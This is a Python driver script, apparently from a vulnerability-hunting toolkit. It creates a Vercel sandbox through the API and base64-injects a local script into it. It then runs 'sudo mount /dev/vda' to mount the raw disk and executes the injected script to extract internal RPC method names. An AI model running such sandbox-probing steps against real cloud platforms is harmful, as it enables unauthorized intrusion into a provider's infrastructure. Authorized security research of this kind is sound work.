# -*- coding: utf-8 -*-
"""v65 驱动: inject _cell_methods.py 执行 (RPC 方法名提取)"""
import sys, os, time, json, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

NAME = 'v65'
SRC = r'D:\scan\_cell_methods.py'
sid = None


def main():
    global sid
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    time.sleep(2)
    c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": NAME}, timeout=120)
    print('[create]', c, r[:200])
    if c != 200:
        raise SystemExit('create failed')
    sid = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(2)
    src = open(SRC, 'rb').read()
    b64 = base64.b64encode(src).decode()
    inject = "import base64;open('/vercel/sandbox/cm.py','wb').write(base64.b64decode('%s'))" % b64
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "python3", "args": ["-c", inject], "wait": True, "logs": True, "timeout": 60000},
               timeout=90)
    print('[inject]', c)
    time.sleep(1)
    s = 'mkdir -p /mnt/vdax; sudo mount /dev/vda /mnt/vdax 2>&1; python3 /vercel/sandbox/cm.py'
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "sh", "args": ["-c", s], "wait": True, "logs": True, "timeout": 120000},
               timeout=150)
    print('[run]', c)
    print((r or '')[:30000])
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED')


if __name__ == '__main__':
    main()
